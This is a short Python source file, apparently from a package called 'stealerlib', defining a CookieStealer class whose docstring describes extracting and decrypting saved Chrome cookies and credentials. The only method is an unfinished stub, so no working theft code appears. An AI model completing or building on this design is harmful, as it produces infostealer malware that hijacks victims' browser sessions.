#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: stealerlib/browser/cookies.py
"""

from stealerlib.browser import *
from stealerlib.exceptions import catch


class CookieStealer:
    """This class provides methods for extracting and decrypting cookies from the Chrome database.

    Attributes:
        cookies         Saved Chrome Cookies
        credentials     A list of tuples containing the cookies and URL -
                        for each site a cookie was saved on

        chrome_path     Path to the browsers 'Local State' directory
        db_path         Path to the browsers local database
        key             Encryption key to be used when accessing encrypted values in the database
    """

    def __init__(self):
        self.cookies = []

    @catch
    def get_cookies(self) -> list[tuple[str, ...]]:
        """Unfinished"""

        return [("")]


